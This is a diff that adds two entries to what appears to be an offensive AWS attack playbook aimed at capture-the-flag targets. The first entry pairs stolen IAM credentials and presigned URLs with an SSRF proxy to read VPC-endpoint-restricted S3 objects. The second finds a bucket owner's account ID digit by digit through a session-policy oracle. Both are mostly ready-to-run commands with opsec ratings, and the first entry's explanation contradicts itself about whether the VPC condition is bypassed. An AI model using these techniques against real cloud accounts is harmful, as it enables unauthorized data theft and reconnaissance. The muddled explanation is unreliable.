@@ -138,3 +138,63 @@
   mysql -h <hostname> -u <user> -P 3306 \
     --enable-cleartext-plugin --password="$TOKEN"
   ```
+
+### S3 VPC Endpoint Policy Bypass via Presigned URL + SSRF Proxy [added: 2026-05]
+- **Tags:** #AWS #S3 #VPCEndpoint #BucketPolicy #PresignedURL #SSRF #PolicyBypass #VPCe #PrivateBucket
+- **Trigger:** S3 bucket denies direct access with 403 referencing `aws:SourceVpce` condition — bucket policy restricts to a specific VPC endpoint ID, but the EC2 instance running a vulnerable app IS inside that VPC
+- **Prereq:** Stolen IAM credentials with `s3:GetObject` on the target bucket + SSRF proxy on an EC2 instance within the target VPC + presigned URL support not blocked
+- **Yields:** Access to S3 objects gated behind VPC endpoint policy without direct network access to the VPC endpoint
+- **Opsec:** Low
+- **Context:** When a bucket policy uses `aws:SourceVpce` to allow access only from a specific VPC endpoint, direct external access is blocked. However, presigned URLs are cryptographically signed with IAM credentials and bypass the `aws:SourceVpce` condition — the VPC check is evaluated at the time of the API call, not the presigned URL request. Route the presigned URL through an SSRF proxy that lives inside the VPC to satisfy the network condition while using externally-stolen creds.
+- **Payload/Method:**
+  ```bash
+  # Step 1 — confirm bucket policy restricts to VPC endpoint
+  aws s3 cp s3://bucket/private/flag.txt .
+  # → 403 Access Denied (aws:SourceVpce: vpce-0abc123...)
+
+  # Step 2 — generate presigned URL using stolen IAM credentials
+  export AWS_ACCESS_KEY_ID=<stolen_key>
+  export AWS_SECRET_ACCESS_KEY=<stolen_secret>
+  export AWS_SESSION_TOKEN=<stolen_token>
+  PRESIGNED=$(aws s3 presign s3://bucket/private/flag.txt --expires-in 3600)
+  echo $PRESIGNED   # URL-encode for use in SSRF proxy
+
+  # Step 3 — route presigned URL through the SSRF proxy endpoint (inside VPC)
+  # URL-encode the presigned URL before passing as query param
+  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PRESIGNED'))")
+  curl -s -u 'ctf:password' "https://target/proxy?url=$ENCODED"
+
+  # Why it works: presigned URL authentication is embedded in the URL signature,
+  # not in the request source IP. The proxy makes the request from inside the VPC,
+  # satisfying aws:SourceVpce, while the signed URL satisfies auth.
+  ```
+
+---
+
+### AWS Account ID Enumeration via s3recon (s3:ResourceAccount Wildcard Brute-Force) [added: 2026-05]
+- **Tags:** #AWS #Recon #AccountIDEnum #S3 #s3recon #IAMConditionKey #ResourceAccount #WildcardBruteForce #CrossAccount #AccountDiscovery
+- **Trigger:** Have an S3 bucket name from the target but the bucket owner's AWS account ID is unknown or incorrect (e.g., extracted from error messages but unverified); all cross-account attacks fail; CTF box provides assumable role with session policy control
+- **Prereq:** An assumable IAM role (or an identity with `sts:AssumeRole`); target S3 bucket name known; `s3recon` tool installed (`pip install s3recon`)
+- **Yields:** Exact 12-digit AWS account ID of the bucket owner; unlocks all cross-account attacks that require knowing the target account ID (SNS subscribe, Lambda invoke, IAM role assumption)
+- **Opsec:** Low (S3 access attempts appear as normal HeadObject/GetObject calls; 120 requests total)
+- **Context:** The `s3:ResourceAccount` IAM condition key can be used in a session policy to gate S3 requests to buckets owned by a specific account prefix. `s3recon` automates digit-by-digit discovery: assume the role with a session policy restricting `s3:ResourceAccount` to `"1*"`, then `"12*"`, etc. A successful request (200 rather than AccessDenied) confirms each digit. This reduces 10¹² brute-force space to 120 requests (12 digits × 10 candidates each). Critical when SNS error messages leak a wrong account ID — the `s3:ResourceAccount` oracle is the ground truth. Do NOT trust account IDs extracted from error messages alone without verification.
+- **Payload/Method:**
+```bash
+# Install s3recon
+pip install s3recon
+
+# Enumerate account ID owning a known bucket
+# --role: assumable role in YOUR account; --bucket: any object path in the target bucket
+python3 -m s3recon.cli \
+  --role arn:aws:iam::<YOUR-ACCT>:role/<assumable-role> \
+  --bucket <target-bucket-name>/index.html
+# Output: Account ID: 123456789012
+
+# Manual approach (if s3recon unavailable): assume role with session policy and probe
+aws sts assume-role \
+  --role-arn arn:aws:iam::<YOUR-ACCT>:role/<assumable-role> \
+  --role-session-name recon \
+  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:GetObject","Resource":"*","Condition":{"StringLike":{"s3:ResourceAccount":"12*"}}}]}' \
+  --query 'Credentials' --output json
+# If successful, account starts with "12"; iterate each digit position
+```
